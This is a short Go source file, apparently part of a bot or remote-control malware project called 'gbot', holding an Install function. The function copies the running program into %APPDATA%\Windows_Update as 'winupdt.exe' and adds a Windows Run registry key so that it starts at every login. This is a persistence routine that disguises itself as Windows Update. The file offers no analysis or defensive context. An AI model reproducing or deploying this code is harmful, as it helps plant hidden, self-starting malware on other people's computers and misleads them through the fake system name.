package bootstrap

import (
	ghelper "gbot/helper"
	"os"
	"strings"
)

// Install the app
// Copy and add to registry
func Install() {
	if !(strings.Contains(os.Args[0], "winupdt.exe")) {
		ghelper.Run("mkdir %APPDATA%\\Windows_Update")
		ghelper.Run("copy " + os.Args[0] + " %APPDATA%\\Windows_Update\\winupdt.exe")
		ghelper.Run("REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /V Windows_Update /t REG_SZ /F /D %APPDATA%\\Windows_Update\\winupdt.exe")
	}
}
